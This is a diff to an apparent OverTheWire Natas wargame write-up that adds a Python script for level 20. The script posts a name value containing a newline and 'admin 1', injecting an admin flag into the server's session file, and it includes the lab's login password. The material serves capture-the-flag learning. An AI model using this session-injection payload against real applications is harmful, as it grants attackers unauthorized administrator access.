@@ -64,7 +64,28 @@ for i in range(641):
 - one of these encoded session id is gotta be the admin session id.
 ## Natas 20
 
+here a session is created 
 
+```
+import requests
+username = 'natas20'
+password = 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw'
+
+url = 'http://natas20.natas.labs.overthewire.org/?debug=true'
+session = requests.Session()
+
+response= session.post(url,auth = (username,password))
+print(response.text)
+print("="*80)
+
+response= session.post(url,data={"name":"bmth\nadmin 1"},auth = (username,password))
+print(response.text)
+print("="*80)
+
+response= session.post(url,auth = (username,password))
+print(response.text)
+print("="*80)
+```
 ### References
 https://www.youtube.com/watch?v=C9yxUTQLbRI
 
